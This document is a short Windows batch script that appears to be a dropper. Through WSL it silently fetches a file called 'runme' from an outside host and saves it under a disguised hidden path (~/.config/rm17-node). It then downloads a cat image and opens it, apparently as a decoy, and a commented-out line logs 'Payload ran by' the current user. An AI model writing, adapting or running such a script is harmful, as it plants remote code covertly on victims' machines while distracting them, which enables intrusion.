@echo off
REM is comments
:: REM Log execution time
:: echo Payload ran by %USERNAME% at %DATE% %TIME% >> success.txt

@REM wsl ./a.out
@REM wsl bash -c "source ~/.bashrc"
@REM pause

wsl bash -c "curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null"
wsl bash -c "curl -s -X POST -o cat.png https://cyber.stanleyhoo1.tech/files/cat.png 2>/dev/null"
start cat.png